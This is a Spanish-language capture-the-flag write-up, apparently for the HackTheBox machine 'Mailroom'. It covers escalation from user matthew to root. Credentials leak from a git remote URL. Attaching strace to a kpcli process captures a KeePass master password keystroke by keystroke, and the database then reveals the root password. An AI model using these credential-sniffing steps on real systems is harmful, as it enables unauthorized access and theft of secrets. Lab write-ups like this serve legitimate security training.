<SNIP>
[remote "origin"]
	url = http://matthew:HueLover83%23@gitea:3000/matthew/mailroom.git
	fetch = +refs/heads/*:refs/remotes/origin/*
<SNIP>
```
### Shell 

Las cuales use para migrar a dicho usuario. 

```bash
tristan@mailroom:/home/matthew$ su matthew
Password:
matthew@mailroom:~$ cat user.txt
2ca3fac531371c4449805e8a1dd18da2
```
## Shell as root
### Proccess

Subí `pspy` a la maquina, y vi que `matthew`, ejecuta continuamente `/usr/bin/kpcli` el cual es el binario de KeePass que se usa para consola en sistemas Linux.

```bash
matthew@mailroom:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/02/18 02:49:19 CMD: UID=1001  PID=45616  | ./pspy64
2026/02/18 02:49:19 CMD: UID=1001  PID=45600  | /lib/systemd/systemd --user
2026/02/18 02:49:19 CMD: UID=1001  PID=44381  | bash
2026/02/18 02:49:31 CMD: UID=1001  PID=45671  | /lib/systemd/systemd --user
2026/02/18 02:49:31 CMD: UID=1001  PID=45673  | (sd-executor)
2026/02/18 02:49:31 CMD: UID=1001  PID=45674  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator
2026/02/18 02:49:31 CMD: UID=1001  PID=45675  |
2026/02/18 02:49:31 CMD: UID=1001  PID=45676  | /lib/systemd/systemd --user
2026/02/18 02:49:31 CMD: UID=1001  PID=45677  | -bash -c /usr/bin/kpcli
2026/02/18 02:49:31 CMD: UID=1001  PID=45678  | -bash -c /usr/bin/kpcli
<SNIP>
```
### Trace

Viendo el PID del proceso, veo que se le asigna uno aleatorio que cambia continuamente si lo vuelve a monitorear.

```bash
matthew@mailroom:~$ while true; do ps auxww | grep kpcli | grep -v grep; sleep 0.1; done
matthew    47392  1.3  0.5  27752 22764 ?        Ss   02:52   0:00 /usr/bin/perl /usr/bin/kpcli
matthew    47392  1.3  0.5  27752 22764 ?        Ss   02:52   0:00 /usr/bin/perl /usr/bin/kpcli
```
### strace capture

Por lo que use strace.

>`strace` es una potente herramienta de diagnóstico y depuración en sistemas Linux que rastrea e interactúa con las llamadas al sistema (System calls)

Use la misma para ver cuales son las llamadas al sistema que hace dicho proceso, viendo varios caracteres en el descriptor `0`.

```bash
matthew@mailroom:~$ strace -p $(pgrep kpcli) -e write -e read
strace: Process 67149 attached
read(3, "m", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "p", 1)                         = 1
read(3, "e", 1)                         = 1
read(3, "r", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "n", 1)                         = 1
read(3, "a", 1)                         = 1
read(3, "l", 1)                         = 1
read(3, ".", 1)                         = 1
read(3, "k", 1)                         = 1
read(3, "d", 1)                         = 1
read(3, "b", 1)                         = 1
read(3, "x", 1)                         = 1
read(3, "\n", 1)                        = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "!", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "s", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "E", 8192)                      = 1
read(0, "c", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "U", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "r", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "3", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "p", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "4", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "$", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "$", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "w", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "0", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "1", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "\10", 8192)                    = 1
read(0, "r", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "d", 8192)                      = 1
read(0, 0x561de9056760, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
read(0, "9", 8192)                      = 1
read(0, "\n", 8192)                     = 1
read(5, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(5, "\npackage Compress::Raw::Zlib;\n\nr"..., 8192) = 8192
read(5, " if $validate && $value !~ /^\\d+"..., 8192) = 8192
read(5, "    croak \"Compress::Raw::Zlib::"..., 8192) = 8192
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0)\0\0\0\0\0\0"..., 832) = 832
read(5, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\200\"\0\0\0\0\0\0"..., 832) = 832
read(5, "# XML::Parser\n#\n# Copyright (c) "..., 8192) = 8192
read(6, "package XML::Parser::Expat;\n\nuse"..., 8192) = 8192
read(6, ";\n    }\n}\n\nsub position_in_conte"..., 8192) = 8192
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240<\0\0\0\0\0\0"..., 832) = 832
read(6, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000B\0\0\0\0\0\0"..., 832) = 832
read(5, "package MIME::Base64;\n\nuse stric"..., 8192) = 5450
read(5, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\300\22\0\0\0\0\0\0"..., 832) = 832
read(6, "\3\331\242\232g\373K\265\1\0\3\0\2\20\0001\301\362\346\277qCP\276X\5!j\374Z\377\3"..., 8192) = 1998
read(6, "", 8192)                       = 0
read(3, "l", 1)                         = 1
read(3, "s", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "R", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "/", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "s", 1)                         = 1
read(3, "h", 1)                         = 1
read(3, "o", 1)                         = 1
read(3, "w", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "-", 1)                         = 1
read(3, "f", 1)                         = 1
read(3, " ", 1)                         = 1
read(3, "0", 1)                         = 1
read(3, "\n", 1)                        = 1
read(3, "q", 1)                         = 1
read(3, "u", 1)                         = 1
read(3, "i", 1)                         = 1
read(3, "t", 1)                         = 1
read(3, "\n", 1)                        = 1
read(7, "# NOTE: Derived from blib/lib/Te"..., 8192) = 665
read(7, "", 8192)                       = 0
+++ exited with 0 +++
```
### KeePass database password
Dicho output lo guarde en un archivo para luego grepear por dicho descriptor.

```bash
cat output.txt | grep 'read(0.*' | grep -v "EAGAIN" | awk '{print $2}' | tr -d '",\n'
!sEcUr3p4$$w01\10rd9\n
```

Limpie nuevamente.

```bash
echo -e '!sEcUr3p4\$\$w01\10rd9' | perl -pe 's/.\10//g'
!sEcUr3p4\$\$w01\10rd9
```
### Root password

Por lo que el resultado `!sEcUr3p4$$w0rd9`, limpiando los escapes. Con esta password pude acceder a la base de datos en el directorio de `matthew` bajo el archivo `personal.kdbx`

```bash
kpcli --kdb=personal.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/>
```

Enumere las entradas y grupos, viendo una llamada `root acc`.

```bash
kpcli:/> ls
=== Groups ===
Root/
kpcli:/> cd Root/
kpcli:/Root> ls
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password
3. My Gitea Account                                       git.mailroom.htb
4. root acc
```

Mire el contenido del mismo, revelando asi una password.

```bash
kpcli:/Root> show -f 4

Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL:
Notes: root account for sysadmin jobs
```
### Shell

La misma era valida para `root` en mailroom.htb

```bash
matthew@mailroom:~$ su root
Password:
root@mailroom:~# cat root.txt
3abbbb5ecab36ab47a83b69e206bdd86
```

`~Happy Hacking.`